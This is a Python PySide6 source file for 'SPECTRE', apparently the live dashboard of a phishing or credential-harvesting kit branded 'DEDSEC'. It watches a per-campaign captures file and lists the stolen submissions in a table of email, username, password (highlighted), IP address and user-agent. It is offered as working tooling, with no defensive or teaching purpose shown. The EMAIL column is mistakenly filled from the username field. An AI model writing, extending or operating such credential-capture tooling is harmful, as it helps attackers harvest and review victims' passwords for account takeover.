# ============================================================
#  File: spectre/track/dashboard.py
#  PySide6 GUI: live view of captures, purple + green theme.
# ============================================================
import json
import os
import sys
from datetime import datetime

from PySide6.QtCore import Qt, QTimer, Signal, QObject
from PySide6.QtGui import QColor, QFont
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QTableWidget, QTableWidgetItem, QHeaderView, QFrame,
    QPushButton, QStatusBar,
)

from .. import theme as T
from .._meta import identity_token


class _Bridge(QObject):
    new_capture = Signal(dict)


class Dashboard(QMainWindow):
    def __init__(self, campaign_id: str, data_dir: str):
        super().__init__()
        self._session = identity_token(
            session_salt=f"dashboard-{campaign_id}")
        self.campaign_id = campaign_id
        self.data_dir = data_dir
        self.captures_file = os.path.join(
            data_dir, f"captures-{campaign_id}.jsonl")
        self._seen = 0

        self.setWindowTitle(
            f"SPECTRE · {campaign_id} · DEDSEC")
        self.resize(1280, 720)

        self._build_ui()
        self._apply_theme()

        self._bridge = _Bridge()
        self._bridge.new_capture.connect(self._add_row)

        self._timer = QTimer(self)
        self._timer.timeout.connect(self._poll)
        self._timer.start(800)

    # ------------------------------------------------------------------
    def _build_ui(self):
        root = QWidget()
        self.setCentralWidget(root)
        outer = QVBoxLayout(root)
        outer.setContentsMargins(16, 16, 16, 16)
        outer.setSpacing(10)

        header = QFrame()
        header.setObjectName("header")
        hl = QHBoxLayout(header)
        hl.setContentsMargins(20, 14, 20, 14)

        title = QLabel("SPECTRE")
        title.setObjectName("title")
        sub = QLabel("LIVE CAPTURE DASHBOARD  ·  DEDSEC")
        sub.setObjectName("subtitle")

        col = QVBoxLayout()
        col.setSpacing(2)
        col.addWidget(title)
        col.addWidget(sub)
        hl.addLayout(col)
        hl.addStretch()

        self.status = QLabel("●  LISTENING")
        self.status.setObjectName("statusLive")
        hl.addWidget(self.status)

        outer.addWidget(header)

        table_frame = QFrame()
        table_frame.setObjectName("card")
        tl = QVBoxLayout(table_frame)
        tl.setContentsMargins(0, 0, 0, 0)

        hdr = QLabel("  ◈  CAPTURED SUBMISSIONS")
        hdr.setObjectName("section")
        tl.addWidget(hdr)

        self.table = QTableWidget(0, 7)
        self.table.setHorizontalHeaderLabels(
            ["#", "TIME", "EMAIL", "USERNAME", "PASSWORD",
             "IP", "USER-AGENT"])
        self.table.horizontalHeader().setSectionResizeMode(
            QHeaderView.Stretch)
        self.table.horizontalHeader().setSectionResizeMode(
            0, QHeaderView.ResizeToContents)
        self.table.verticalHeader().setVisible(False)
        self.table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.table.setAlternatingRowColors(True)
        tl.addWidget(self.table, 1)

        outer.addWidget(table_frame, 1)

        self.statusBar = QStatusBar()
        self.setStatusBar(self.statusBar)
        self.statusBar.showMessage(
            f"watching {self.captures_file}")

    # ------------------------------------------------------------------
    def _apply_theme(self):
        self.setStyleSheet(f"""
            QMainWindow, QWidget {{
                background-color: {T.HEX['bg']};
                color: {T.HEX['text']};
                font-family: "JetBrains Mono", Consolas, monospace;
            }}
            QLabel#title {{
                color: {T.HEX['purple_hi']};
                font-size: 22px;
                font-weight: 800;
                letter-spacing: 8px;
            }}
            QLabel#subtitle {{
                color: {T.HEX['green_hi']};
                font-size: 10px;
                letter-spacing: 3px;
            }}
            QLabel#section {{
                background-color: {T.HEX['purple_deep']};
                color: {T.HEX['purple_hi']};
                letter-spacing: 4px;
                font-weight: 700;
                font-size: 11px;
                padding: 8px 14px;
                border-bottom: 1px solid {T.HEX['purple_dim']};
            }}
            QLabel#statusLive {{
                background-color: {T.HEX['green']};
                color: {T.HEX['bg']};
                font-weight: 800;
                letter-spacing: 3px;
                padding: 6px 16px;
                border-radius: 4px;
                font-size: 11px;
            }}
            QFrame#header {{
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 rgba(199,125,255,0.08), stop:1 transparent),
                    {T.HEX['bg_panel']};
                border: 1px solid {T.HEX['line']};
                border-bottom: 2px solid {T.HEX['purple']};
                border-radius: 6px;
            }}
            QFrame#card {{
                background-color: {T.HEX['bg_panel']};
                border: 1px solid {T.HEX['line']};
                border-radius: 6px;
            }}
            QTableWidget {{
                background-color: {T.HEX['bg_panel']};
                gridline-color: {T.HEX['line_soft']};
                border: none;
                alternate-background-color: {T.HEX['bg_input']};
                selection-background-color: {T.HEX['purple_deep']};
                selection-color: {T.HEX['purple_hi']};
            }}
            QTableWidget::item {{ padding: 6px 10px; }}
            QHeaderView::section {{
                background-color: {T.HEX['purple_deep']};
                color: {T.HEX['green_hi']};
                padding: 8px 10px;
                border: none;
                border-bottom: 1px solid {T.HEX['purple_dim']};
                font-size: 10px;
                letter-spacing: 2px;
                font-weight: 700;
            }}
            QStatusBar {{
                background-color: {T.HEX['bg_panel']};
                color: {T.HEX['text_dim']};
                border-top: 1px solid {T.HEX['purple_dim']};
                padding: 4px 8px;
            }}
        """)

    # ------------------------------------------------------------------
    def _poll(self):
        if not os.path.isfile(self.captures_file):
            return
        try:
            with open(self.captures_file) as f:
                lines = f.readlines()
        except Exception:
            return
        while self._seen < len(lines):
            try:
                rec = json.loads(lines[self._seen])
                self._bridge.new_capture.emit(rec)
            except Exception:
                pass
            self._seen += 1

    def _add_row(self, rec: dict):
        row = self.table.rowCount()
        self.table.insertRow(row)
        cells = [
            str(row + 1),
            rec.get("ts", "")[-9:-1] if rec.get("ts") else "",
            rec.get("username", ""),
            rec.get("username", ""),
            rec.get("password", ""),
            rec.get("ip", ""),
            (rec.get("user_agent", "") or "")[:50],
        ]
        for c, text in enumerate(cells):
            item = QTableWidgetItem(text)
            if c == 4:
                item.setForeground(QColor(T.HEX["green_hi"]))
                f = item.font(); f.setBold(True); item.setFont(f)
            elif c == 2:
                item.setForeground(QColor(T.HEX["purple_hi"]))
            self.table.setItem(row, c, item)
        self.table.scrollToBottom()


def run_dashboard(campaign_id: str, data_dir: str) -> int:
    app = QApplication.instance() or QApplication(sys.argv)
    win = Dashboard(campaign_id, data_dir)
    win.show()
    return app.exec()
